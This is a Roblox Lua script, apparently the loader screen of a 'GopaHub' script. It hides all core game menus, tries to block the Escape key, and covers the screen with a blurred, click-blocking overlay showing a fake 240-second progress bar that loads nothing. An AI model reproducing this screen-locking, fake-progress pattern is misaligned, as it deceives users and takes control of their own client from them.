local StarterGui = game:GetService("StarterGui")
local Lighting = game:GetService("Lighting")
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")

-- Функция отключения всех кнопок Roblox
local function disableCoreGui()
	for _, guiType in ipairs(Enum.CoreGuiType:GetEnumItems()) do
		StarterGui:SetCoreGuiEnabled(guiType, false)
	end
end

-- Вызываем один раз и потом проверяем каждые 0.2 сек
disableCoreGui()
task.spawn(function()
	while true do
		task.wait(0.2)
		disableCoreGui()
	end
end)

-- Блок клавиш
UserInputService.InputBegan:Connect(function(input, gpe)
	if gpe then return end
	if input.KeyCode == Enum.KeyCode.Escape then
		return true -- блокируем выход
	end
end)

-- Блюр
local blur = Instance.new("BlurEffect")
blur.Size = 20
blur.Parent = Lighting

-- GUI
local screenGui = Instance.new("ScreenGui")
screenGui.IgnoreGuiInset = true
screenGui.ResetOnSpawn = false
screenGui.Parent = Players.LocalPlayer:WaitForChild("PlayerGui")

local overlay = Instance.new("Frame")
overlay.Size = UDim2.new(1, 0, 1, 0)
overlay.BackgroundColor3 = Color3.fromRGB(20, 0, 40)
overlay.BackgroundTransparency = 0.3
overlay.ZIndex = 100
overlay.Active = true -- блок кликов
overlay.Parent = screenGui

-- Заголовок
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0.15, 0)
title.Position = UDim2.new(0, 0, 0.1, 0)
title.BackgroundTransparency = 1
title.Text = "GopaHub"
title.TextScaled = true
title.Font = Enum.Font.GothamBold
title.TextColor3 = Color3.fromRGB(200, 100, 255)
title.ZIndex = 110
title.Parent = overlay

-- Прогресс-бар
local barFrame = Instance.new("Frame")
barFrame.Size = UDim2.new(0.6, 0, 0.05, 0)
barFrame.Position = UDim2.new(0.2, 0, 0.5, 0)
barFrame.BackgroundColor3 = Color3.fromRGB(60, 0, 100)
barFrame.BorderSizePixel = 0
barFrame.ZIndex = 110
barFrame.Parent = overlay

local progressBar = Instance.new("Frame")
progressBar.Size = UDim2.new(0, 0, 1, 0)
progressBar.BackgroundColor3 = Color3.fromRGB(200, 100, 255)
progressBar.BorderSizePixel = 0
progressBar.ZIndex = 111
progressBar.Parent = barFrame

local progressText = Instance.new("TextLabel")
progressText.Size = UDim2.new(1, 0, 1.5, 0)
progressText.Position = UDim2.new(0, 0, 1.2, 0)
progressText.BackgroundTransparency = 1
progressText.Text = "Loading... 0%"
progressText.TextScaled = true
progressText.Font = Enum.Font.Gotham
progressText.TextColor3 = Color3.fromRGB(200, 100, 255)
progressText.ZIndex = 111
progressText.Parent = barFrame

-- Время загрузки
local totalTime = 240
local stepTime = totalTime / 100

-- Заполнение прогресса
for i = 1, 100 do
	progressBar.Size = UDim2.new(i/100, 0, 1, 0)
	progressText.Text = "Loading... " .. i .. "%"
	wait(stepTime)
end

-- После загрузки возвращаем CoreGui
for _, guiType in ipairs(Enum.CoreGuiType:GetEnumItems()) do
	StarterGui:SetCoreGuiEnabled(guiType, true)
end
blur:Destroy()
screenGui:Destroy()
